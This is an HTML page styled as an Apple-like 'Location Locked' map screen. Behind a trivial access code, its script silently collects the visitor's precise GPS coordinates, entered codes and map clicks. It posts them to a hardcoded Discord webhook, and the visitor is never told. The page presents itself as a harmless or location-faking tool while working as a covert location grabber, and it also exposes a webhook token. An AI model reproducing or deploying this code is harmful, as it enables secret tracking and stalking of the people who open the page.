<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <title>Apple Style Location</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #e6f0ff, #f8fbff);
    }

    #map {
      height: 100vh;
      width: 100vw;
      display: none;
      filter: saturate(1.05);
    }

    .popup {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
    }

    .popup-content {
      background: rgba(255, 255, 255, 0.6);
      padding: 30px;
      border-radius: 24px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
      text-align: center;
      max-width: 320px;
      width: 90%;
      backdrop-filter: blur(20px);
      animation: fadeIn 0.5s ease-in-out;
    }

    .popup-content h2 {
      font-weight: 600;
      margin-bottom: 14px;
      color: #1a1a1a;
    }

    .popup-content input {
      padding: 12px;
      width: 100%;
      border-radius: 14px;
      border: none;
      background: rgba(255, 255, 255, 0.7);
      font-size: 16px;
      margin-top: 10px;
      transition: all 0.3s ease;
      box-shadow: inset 0 0 0 1px rgba(0,0,0,0.1);
    }

    .popup-content input:focus {
      outline: none;
      box-shadow: inset 0 0 0 2px #007aff;
      background: white;
    }

    .popup-content button {
      margin-top: 18px;
      padding: 12px 24px;
      border: none;
      background: linear-gradient(to right, #007aff, #559dff);
      color: white;
      font-size: 16px;
      font-weight: 600;
      border-radius: 18px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .popup-content button:hover {
      background: linear-gradient(to right, #0065e0, #478dff);
      transform: scale(1.02);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to   { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>

<!-- Code-Popup mit Glaslook -->
<div class="popup" id="popup">
  <div class="popup-content">
    <h2>Location Locked</h2>
    <input type="text" id="codeInput" placeholder="Enter access code">
    <button onclick="checkCode()">Continue</button>
  </div>
</div>

<!-- Karte -->
<div id="map"></div>

<!-- Leaflet + Logging -->
<script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
<script>
  const webhookUrl = "https://discord.com/api/webhooks/1340763818195812384/4MkBGKZpLKa7CgBAv-MHkJsRjFaM-tPlPE31x7uUC-_f4EMOfqgnHupLELASCwChUPZo";

  function sendLog(message) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });
  }

  let map;
  let marker;

  const customIcon = L.icon({
    iconUrl: 'https://em-content.zobj.net/source/apple/325/round-pushpin_1f4cd.png',
    iconSize: [40, 40],
    iconAnchor: [20, 40]
  });

  function checkCode() {
    const code = document.getElementById("codeInput").value;
    if (code === "1234") {
      document.getElementById("popup").style.display = "none";
      document.getElementById("map").style.display = "block";
      sendLog("‚úÖ Code eingegeben: " + code);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          map = L.map('map').setView([lat, lon], 15);
          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
          }).addTo(map);

          L.marker([lat, lon], { icon: customIcon }).addTo(map);
          sendLog(`üìç Aktuelle Position erkannt: ${lat}, ${lon}`);

          map.on('click', function(e) {
            if (marker) map.removeLayer(marker);
            marker = L.marker(e.latlng, { icon: customIcon }).addTo(map);
            sendLog(`üìå Neue Fake-Location gesetzt bei: ${e.latlng.lat}, ${e.latlng.lng}`);
          });

        }, function(error) {
          sendLog("‚ùå Geolocation fehlgeschlagen oder verweigert.");
        });
      } else {
        sendLog("‚ùå Geolocation nicht unterst√ºtzt.");
      }
    } else {
      alert("Falscher Code.");
      sendLog("‚ö†Ô∏è Falscher Codeversuch: " + code);
    }
  }
</script>

</body>
</html>
